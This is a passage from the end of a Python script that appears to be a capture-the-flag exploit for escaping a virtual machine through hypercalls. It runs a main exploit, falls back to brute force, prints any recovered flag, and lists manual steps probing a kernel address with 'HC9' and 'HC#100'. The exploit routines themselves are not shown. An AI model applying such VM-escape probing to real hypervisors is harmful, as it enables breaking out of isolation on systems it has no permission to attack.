        print(f"\n{C.G}{'='*70}{C.E}")
        print(f"{C.G} FLAG (hex): 0x{flag:x}{C.E}")
        print(f"{C.G}{'='*70}{C.E}")
        sys.exit(0)
    
    # If simple test fails, run the full exploit
    main()
    
    # If still no flag, try brute force
    print(f"\n{C.Y}[!]{C.E} Main exploit failed, trying brute force...")
    flag = brute_force_all()
    
    if flag:
        print(f"\n{C.G}{'='*70}{C.E}")
        print(f"{C.G} FLAG (hex): 0x{flag:x}{C.E}")
        print(f"{C.G}{'='*70}{C.E}")
    else:
        print(f"\n{C.R}{'='*70}{C.E}")
        print(f"{C.R} NO ESCAPE FOUND{C.E}")
        print(f"{C.R} Try manual exploration with:{C.E}")
        print(f"  1. HC9(0xffffffff826279a8, clock_type, size)")
        print(f"  2. Check HC#100 after each attempt")
        print(f"  3. Any non-zero/non-0xff return is the flag")
        print(f"{C.R}{'='*70}{C.E}")
